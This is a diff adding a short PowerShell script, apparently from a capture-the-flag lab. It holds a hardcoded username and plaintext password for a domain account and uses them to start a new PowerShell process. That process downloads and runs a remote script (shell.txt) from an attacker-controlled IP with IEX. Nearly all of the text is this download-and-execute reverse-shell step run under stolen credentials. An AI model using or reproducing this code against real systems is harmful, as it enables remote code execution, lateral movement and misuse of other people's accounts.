@@ -1,0 +1,7 @@
+#powershell
+$user = "flight\c.bum" 
+$passwd = ConvertTo-SecureString 'Tikkycoll_431012284' -AsPlainText -Force;
+$creds =New-Object System.Management.Automation.PSCredential($user, $passwd)
+$script = {IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.194:8000/shell.txt')}
+Start-Process powershell.exe -Credential $creds -ArgumentList ("-Command $script")
+
